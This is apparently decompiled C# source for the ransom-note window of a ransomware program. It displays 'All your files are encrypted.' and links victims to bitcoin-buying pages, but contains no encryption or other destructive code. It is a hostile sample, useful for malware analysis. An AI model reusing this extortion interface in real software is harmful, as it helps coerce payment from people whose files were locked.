using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace DP_MainForm;

public class Form1 : Form
{
	private IContainer components = null;

	private void LocalbitcoinsLL_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://localbitcoins.com/buy_bitcoins");
	}

	private void howLL_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://www.coindesk.com/information/how-can-i-buy-bitcoins/");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
	}

	private void Form1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Capture(false);
		Message val = Message.Create(((Control)this).get_Handle(), 161, new IntPtr(2), IntPtr.Zero);
		((Control)this).WndProc(ref val);
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Capture(false);
		Message val = Message.Create(((Control)this).get_Handle(), 161, new IntPtr(2), IntPtr.Zero);
		((Control)this).WndProc(ref val);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(12f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(325, 207));
		((Control)this).set_Font(new Font("Modern No. 20", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(6));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("All your files are encrypted.");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(Form1_MouseDown));
		((Control)this).ResumeLayout(false);
	}
}
